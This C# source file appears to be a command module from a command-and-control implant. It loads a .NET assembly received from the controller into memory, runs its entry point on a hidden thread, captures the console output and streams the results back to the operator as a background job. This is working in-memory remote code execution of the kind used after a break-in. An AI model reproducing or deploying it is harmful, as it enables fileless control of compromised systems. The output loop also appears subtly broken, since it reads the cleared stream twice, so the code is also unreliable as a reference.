using Agent.Models;
using Agent.Service;
using Shared;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class AssemblyCommand : AgentCommand
    {
        public override CommandId Command => CommandId.Assembly;

        public override async Task InnerExecute(AgentTask task, AgentCommandContext context, CancellationToken token)
        {
            task.ThrowIfParameterMissing(ParameterId.File, $"Assembly is mandatory!");
            task.ThrowIfParameterMissing(ParameterId.Name, $"Assembly name is mandatory!");

            var name = task.GetParameter<string>(ParameterId.Name);

            /* var currentOut = Console.Out;
             var currentError = Console.Out;
             using (var ms = new MemoryStream())
             using (var sw = new StreamWriter(ms))
             {
                 Console.SetOut(sw);
                 Console.SetError(sw);
                 sw.AutoFlush = true;


                 var assembly = Assembly.Load(file.GetFileContent());
                 assembly.EntryPoint.Invoke(null, new object[] { args.ToArray() });

                 Console.Out.Flush();
                 Console.Error.Flush();

                 Console.SetOut(currentOut);
                 Console.SetError(currentError);

                 var output = Encoding.UTF8.GetString(ms.ToArray());
                 context.AppendResult(output);
             }*/

            using (var ms = new MemoryStream())
            {
                using (var sw = new StreamWriter(ms) { AutoFlush = true })
                {

                    // hijack console output
                    var stdOut = Console.Out;
                    var stdErr = Console.Error;

                    Console.SetOut(sw);
                    Console.SetError(sw);

                    Thread t = null;
                    t = new Thread(RunAssembly);
                    t.Start(task);

                    //register as Job
                    var jobService = ServiceProvider.GetService<IJobService>();
                    this.JobId = jobService.RegisterJob(context.TokenSource, task.GetParameter<string>(ParameterId.Name), task.Id).Id;

                    // whilst assembly is executing
                    // keep looping and reading stream

                    byte[] output;

                    Stopwatch stopwatch = new Stopwatch();
                    stopwatch.Start();

                    do
                    {
                        // check cancellation token
                        if (token.IsCancellationRequested)
                        {
                            t.Abort();
                            break;
                        }


                        output = ReadStream(ms);

                        if (output.Length > 0)
                            context.AppendResult(Encoding.UTF8.GetString(ReadStream(ms)));

                        if (stopwatch.ElapsedMilliseconds > context.ConfigService.JobResultDelay)
                        {
                            context.Agent.SendTaskResult(context.Result).Wait();
                            context.ClearResult();
                            stopwatch.Restart();
                        }

                        Thread.Sleep(100);

                    } while (t.IsAlive);

                    // after task has finished, do a final read
                    context.AppendResult(Encoding.UTF8.GetString(ReadStream(ms)));


                    // restore console
                    Console.SetOut(stdOut);
                    Console.SetError(stdErr);
                }
            }
        }

        private static byte[] ReadStream(MemoryStream ms)
        {
            var output = ms.ToArray();

            if (output.Length > 0)
            {
                byte[] buffer = ms.GetBuffer();
                Array.Clear(buffer, 0, buffer.Length);
                ms.Position = 0;
                ms.SetLength(0);
            }

            return output;
        }

        async void RunAssembly(object tsk)
        {
            var task = tsk as AgentTask;

            var args = task.GetParameter<string>(ParameterId.Parameters).GetArgs();
            var bin = task.GetParameter(ParameterId.File);
            var assembly = Assembly.Load(bin);
            assembly.EntryPoint?.Invoke(null, new object[] { args });
        }


    }
}
